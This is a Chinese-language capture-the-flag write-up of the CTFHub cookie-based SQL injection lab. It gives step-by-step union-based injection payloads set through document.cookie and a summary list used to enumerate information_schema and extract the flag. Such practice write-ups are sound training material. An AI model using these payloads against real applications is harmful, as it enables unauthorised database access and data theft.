---
title: CTFHub-SQL注入-Cookie注入 Writeup
date: 2026-09-29
category: web
tags: [CTFHub, SQL注入, Cookie注入]
---
## 题目分析

题目提示：“这次的输入点变了，尝试找找Cookie吧”。
打开靶场环境，发现常规的 URL 参数（如 ?id=1）被过滤或者无法使用。
根据提示，注入点转移到了 HTTP 请求头的 Cookie 字段中。

## 解题步骤

### 1. 寻找注入点与判断注入类型

使用浏览器 F12 开发者工具（控制台 Console），通过修改 document.cookie 来测试注入。每次修改后按 F5 刷新页面查看回显。

· document.cookie = "id=1 and 1=1"; -> 页面正常。
· document.cookie = "id=1 and 1=2"; -> 页面空白或异常。
  结论：存在数字型注入。

### 2. 判断字段数 (Order By)

· document.cookie = "id=1 order by 2"; -> 页面正常。
· document.cookie = "id=1 order by 3"; -> 页面异常。
  结论：当前查询有 2 个字段。

### 3. 确定回显位置 (Union Select)

· document.cookie = "id=-1 union select 1,2"; -> 刷新页面，页面回显 ID: 1, Data: 2（假设回显在第二位，即 Data: 后面）。
  结论：第 2 个字段可以输出数据。

### 4. 获取数据库名

· document.cookie = "id=-1 union select 1,database()";
· 刷新页面，回显 Data: sqli。
  当前数据库名为：sqli

### 5. 获取表名

· document.cookie = "id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'";
· 刷新页面，回显 Data: yuxwlqtweu,news。
  发现可疑的表名：yuxwlqtweu 和 news

### 6. 获取字段名

· document.cookie = "id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='yuxwlqtweu'";
· 刷新页面，回显 Data: rfmefanbpq。
  获取到字段名：rfmefanbpq

### 7. 提取最终 Flag

· document.cookie = "id=-1 union select 1,rfmefanbpq from yuxwlqtweu";
· 刷新页面，Data: 位置显示最终的 ctfhub{xxxxxxxxxxxxxxxx}。

## 核心 Payload 总结

```text
1. 判断注入：Cookie: id=1 and 1=2
2. 判断字段：Cookie: id=1 order by 2
3. 判断回显：Cookie: id=-1 union select 1,2
4. 查库名：Cookie: id=-1 union select 1,database()
5. 查表名：Cookie: id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'
6. 查字段：Cookie: id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='yuxwlqtweu'
7. 拿Flag：Cookie: id=-1 union select 1,rfmefanbpq from yuxwlqtweu
```
## Flag
ctfhub{6acd6d413399c52cafb4faed}
## 技巧总结 (Tips)

· 浏览器控制台修改 Cookie：适合没有抓包工具（如 Burp Suite）的新手。使用 document.cookie = "key=value" 写入后，必须按 F5 刷新页面，服务端才会收到修改后的 Cookie。
· 浏览器安全限制：新版 Chrome/Edge 默认禁止在控制台粘贴代码，需要先手动输入“允许粘贴”并按回车解锁。
· 信息收集顺序：MySQL 注入的核心思路是从 information_schema 系统库中逐层剥丝抽茧：库 -> 表 -> 字段 -> 数据。
